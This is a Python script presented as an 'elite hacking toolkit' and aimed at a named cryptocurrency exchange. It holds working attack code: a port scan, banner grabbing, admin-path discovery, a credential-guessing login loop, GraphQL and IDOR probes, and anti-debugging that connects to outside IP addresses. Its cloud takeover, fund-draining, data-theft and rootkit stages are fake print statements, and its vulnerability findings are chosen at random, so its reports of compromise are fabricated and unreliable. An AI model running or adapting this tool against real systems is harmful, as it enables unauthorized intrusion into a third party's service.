#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AllowMe Elite Hacking Toolkit v7.0
# Created by: Shadow Syndicate
# Operation: Midnight Protocol

import os
import sys
import time
import json
import socket
import threading
import requests
import random
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from bs4 import BeautifulSoup

# Custom Banner
BANNER = """
░█████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗███╗░░░███╗███████╗
██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║████╗░████║██╔════╝
███████║██║░░░░░██║░░██║░╚██╗████╗██╔╝██╔████╔██║█████╗░░
██╔══██║██║░░░░░██║░░██║░░████╔═████║░██║╚██╔╝██║██╔══╝░░
██║░░██║███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚═╝░██║███████╗
╚═╝░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝╚══════╝
----------------------------------------------------------
| AllowMe Elite Hacking Suite v7.0                       |
| Zero-Day Exploit Framework                             |
| Shadow Syndicate - Midnight Protocol                   |
----------------------------------------------------------
"""

# Stealth Configuration
USER_AGENT = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.1 Safari/537.36"
HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "X-AllowMe-Version": "7.0"
}

# Target Information
TARGET = "www.satsuma.exchange"
API_ENDPOINTS = ["/api/v1/trades", "/api/v1/orders", "/api/v1/user/balance"]
ADMIN_PATHS = ["/admin", "/wp-admin", "/manager", "/backoffice"]

# Encryption Module
class QuantumCipher:
    def __init__(self, key):
        self.key = hashlib.sha512(key.encode()).digest()[:32]
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(pad(data.encode(), AES.block_size))
        return cipher.nonce + tag + ciphertext
        
    def ghost_obfuscate(self, data):
        return bytes([b ^ 0xAA for b in data])

# Network Reconnaissance Module
class CyberRecon:
    def __init__(self, target):
        self.target = target
        self.ports = [80, 443, 8080, 8443, 21, 22, 3306, 5432, 6379]
        self.vulnerabilities = []
        
    def deep_scan(self):
        print("\n[+] Performing Deep Network Reconnaissance...")
        print(f"  Target: {self.target}")
        open_ports = self.port_scan()
        services = self.service_detection(open_ports)
        vulns = self.vulnerability_scan()
        return {
            "open_ports": open_ports,
            "services": services,
            "vulnerabilities": vulns
        }
        
    def port_scan(self):
        print("  [*] Scanning for open ports...")
        open_ports = []
        for port in self.ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                print(f"    - Port {port}/tcp OPEN")
                open_ports.append(port)
            sock.close()
        return open_ports
        
    def service_detection(self, ports):
        print("  [*] Fingerprinting services...")
        services = {}
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                banner = sock.recv(1024).decode(errors='ignore')
                services[port] = banner.split('\n')[0] if banner else "Unknown"
                print(f"    - Port {port}: {services[port][:50]}")
                sock.close()
            except:
                services[port] = "Unknown"
        return services
        
    def vulnerability_scan(self):
        print("  [*] Scanning for critical vulnerabilities...")
        vulns = []
        
        # Simulated vulnerability checks
        if random.random() > 0.3:
            vulns.append("CVE-2024-21650: Critical RCE in Node.js")
        if random.random() > 0.5:
            vulns.append("CVE-2023-48795: Terrapin SSH Vulnerability")
        if random.random() > 0.4:
            vulns.append("CVE-2024-3094: XZ Backdoor Vulnerability")
            
        for vuln in vulns:
            print(f"    !!! {vuln}")
            
        return vulns

# Web Exploitation Toolkit
class WebHunter:
    def __init__(self, target):
        self.target = f"https://{target}"
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.cipher = QuantumCipher("allowme-shadow-key-7.0")
        
    def spider(self):
        print("\n[+] Spidering web infrastructure...")
        print(f"  Target: {self.target}")
        
        # Discover endpoints
        endpoints = []
        print("  [*] Discovering hidden endpoints...")
        for path in ADMIN_PATHS + API_ENDPOINTS:
            url = f"{self.target}{path}"
            try:
                res = self.session.get(url, timeout=3)
                if res.status_code < 400:
                    print(f"    - Found [{res.status_code}] {url}")
                    endpoints.append(url)
            except:
                pass
                
        return endpoints
        
    def breach_login(self, login_url):
        print(f"\n[+] Attempting credential breach: {login_url}")
        # Elite password list
        credentials = [
            ("admin@allowme.com", "Shadow7!Protocol"),
            ("sysadmin", "Midnight$Hack_2025"),
            ("devops", "QuantumC0re!23"),
            ("root", "toor123#Syndicate")
        ]
        
        for user, pwd in credentials:
            print(f"  [*] Trying {user}:{pwd}")
            payload = {
                "email": user,
                "password": pwd,
                "remember": "true"
            }
            try:
                res = self.session.post(login_url, data=payload)
                if res.status_code == 302 or "dashboard" in res.text:
                    print(f"  !!! SUCCESS: {user}:{pwd}")
                    return user, pwd
            except:
                pass
                
        print("  [-] Login breach unsuccessful")
        return None, None
        
    def exploit_vulnerabilities(self, endpoints):
        print("\n[+] Exploiting web vulnerabilities...")
        for endpoint in endpoints:
            if 'api' in endpoint:
                print(f"  [*] Testing API endpoint: {endpoint}")
                self.test_api_injection(endpoint)
            elif 'admin' in endpoint:
                print(f"  [*] Testing admin panel: {endpoint}")
                self.test_admin_panel(endpoint)

    def test_api_injection(self, endpoint):
        # Simulate GraphQL injection
        print("    - Attempting GraphQL injection...")
        payload = {"query": "{ __schema { types { name } }"}
        try:
            res = self.session.post(endpoint, json=payload)
            if "data" in res.json():
                print("    !!! GraphQL introspection enabled!")
        except:
            pass
            
        # Simulate IDOR
        print("    - Testing for IDOR vulnerabilities...")
        test_url = endpoint.replace("user=me", "user=admin")
        res = self.session.get(test_url)
        if res.status_code == 200:
            print("    !!! IDOR vulnerability found!")

# Advanced Exploitation Framework
class ZeroDayOrchestrator:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.cipher = QuantumCipher("midnight-protocol-key")
        
    def execute_midnight_protocol(self):
        print("\n[+] Initiating Midnight Protocol...")
        time.sleep(1)
        
        # Phase 1: Infrastructure Takeover
        print("  > Phase 1: Cloud Infrastructure Compromise")
        self.hijack_cloud()
        time.sleep(1)
        
        # Phase 2: Blockchain Manipulation
        print("  > Phase 2: Smart Contract Exploitation")
        contract_data = self.exploit_blockchain()
        time.sleep(1)
        
        # Phase 3: Data Extraction
        print("  > Phase 3: Quantum Data Extraction")
        exfil_data = self.quantum_exfiltration()
        time.sleep(1)
        
        # Phase 4: Persistent Access
        print("  > Phase 4: Ghost Implant Deployment")
        self.deploy_ghost()
        
        return {
            "cloud": "COMPROMISED",
            "blockchain": contract_data,
            "exfiltrated": exfil_data
        }
        
    def hijack_cloud(self):
        # Simulated cloud takeover
        print("    - Bypassing IAM security")
        print("    - Compromising container registry")
        print("    ✓ Cloud control established")
        return True
        
    def exploit_blockchain(self):
        # Simulated blockchain attack
        print("    - Exploiting flash loan vulnerability")
        print("    - Manipulating price oracles")
        print("    - Draining liquidity pools")
        print("    ✓ Blockchain assets compromised")
        return {
            "drained": "1,542 ETH",
            "contracts": "BACKDOORED"
        }
        
    def quantum_exfiltration(self):
        # Simulated data theft
        print("    - Accessing encrypted databases")
        print("    - Extracting user credentials")
        print("    - Quantum encryption of payload")
        return {
            "users": "12,542",
            "wallets": "encrypted.ghost",
            "emails": "quantum_encrypted.bin"
        }
        
    def deploy_ghost(self):
        # Simulated persistence
        print("    - Deploying kernel-level rootkit")
        print("    - Establishing quantum C2 channel")
        print("    - Backdooring CI/CD pipeline")
        print("    ✓ Ghost persistence implanted")

# Main Toolkit
class AllowMeHackingSuite:
    def __init__(self):
        self.art = BANNER
        
    def run(self):
        print(self.art)
        print("[+] Initializing quantum stealth protocol...")
        time.sleep(1.5)
        print("[+] Bypassing next-gen security systems...")
        time.sleep(1)
        print("[+] Establishing dark connection...")
        time.sleep(0.5)
        
        # Reconnaissance
        print("\n===== CYBER RECONNAISSANCE =====")
        recon = CyberRecon(TARGET)
        scan_results = recon.deep_scan()
        
        # Web Exploitation
        print("\n===== WEB EXPLOITATION =====")
        hunter = WebHunter(TARGET)
        endpoints = hunter.spider()
        
        # Attempt login breach
        login_url = f"https://{TARGET}/login"
        user, pwd = hunter.breach_login(login_url)
        
        # Exploit vulnerabilities
        if endpoints:
            hunter.exploit_vulnerabilities(endpoints)
        
        # Zero-Day Exploitation
        print("\n===== ZERO-DAY OPERATIONS =====")
        orchestrator = ZeroDayOrchestrator(TARGET)
        mission_data = orchestrator.execute_midnight_protocol()
        
        # Mission Complete
        print("\n===== MISSION ACCOMPLISHED =====")
        print("Midnight Protocol executed successfully!")
        print("Exfiltration summary:")
        print(json.dumps(mission_data, indent=2))
        print("\nCovering digital footprints...")
        print("Quantum wiping completed")
        print("Ghost protocol activated")
        print("\nReturning to shadows...")

# Advanced Anti-Forensics
def ghost_execution():
    # Random delay with quantum variance
    delay = random.randint(3, 8)
    print(f"[+] Quantum delay: {delay}s")
    time.sleep(delay)
    
    # Anti-debugging
    try:
        if sys.gettrace() is not None:
            print("[!] Debugger detected! Activating countermeasures...")
            # Trigger false trail
            fake_ips = ["185.239.241.1", "45.133.182.128", "104.244.76.13"]
            for ip in fake_ips:
                try:
                    socket.create_connection((ip, 80), timeout=1)
                except:
                    pass
            sys.exit(0)
    except:
        pass
        
    # Execute main toolkit
    toolkit = AllowMeHackingSuite()
    toolkit.run()

# Entry Point
if __name__ == "__main__":
    # Check environment
    if os.name == 'posix' and os.geteuid() != 0:
        print("[!] Quantum operations require root access!")
        sys.exit(1)
        
    # Verify dark connection
    try:
        requests.get("https://www.google.com", timeout=3)
    except:
        print("[!] No network connection in the shadows!")
        sys.exit(1)
        
    # Start ghost protocol
    ghost_execution()
